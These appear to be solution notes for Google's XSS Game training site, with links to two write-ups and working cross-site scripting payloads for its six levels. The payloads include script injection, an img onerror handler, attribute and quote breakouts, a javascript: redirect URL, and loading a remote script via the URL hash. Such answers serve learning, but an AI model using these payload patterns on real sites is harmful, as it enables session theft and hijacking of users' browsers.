http://blog.dornea.nu/2014/06/02/googles-xss-game-solutions/
http://blog.ring-zer0.com/2014/05/google-xss-game-answers.html

Challenge 1:
<script>alert(0);</script>

Challenge 2:
<img src=wizbang onerror='alert(0)' />

Challenge 3:
Common JS functions are execution sinks which means that they will cause the browser to execute any scripts that appear in their input
'/><script>alert(0);</script>
https://xss-game.appspot.com/level3/frame#1'/><script>alert(0);</script>
https://xss-game.appspot.com/level3/frame#1' onerror='alert(5)'

Challenge 4:
<img src="/static/loading.gif" onload="startTimer('3');alert('1');" />
3');alert('0

Challenge 5:
DOM based XSS
Cross-site scripting isn't just about correctly escaping data. Sometimes, attackers can do bad things even without injecting new elements into the DOM.
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)

Challenge 6:
Complex web applications sometimes have the capability to dynamically load JavaScript libraries based on the value of their URL parameters or part of location.hash.
This is very tricky to get right -- allowing user input to influence the URL when loading scripts or other potentially dangerous types of data such as XMLHttpRequest often leads to serious vulnerabilities.
https://xss-game.appspot.com/level6/frame#data:text/javascript,alert(0);
https://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw.php?i=15S5qZs0
OR
URL=https://xss-game.appspot.com/level6/frame#Https://192.168.1.1/xss.js
URL=https://xss-game.appspot.com/level6/frame#//192.168.1.1/xss.js
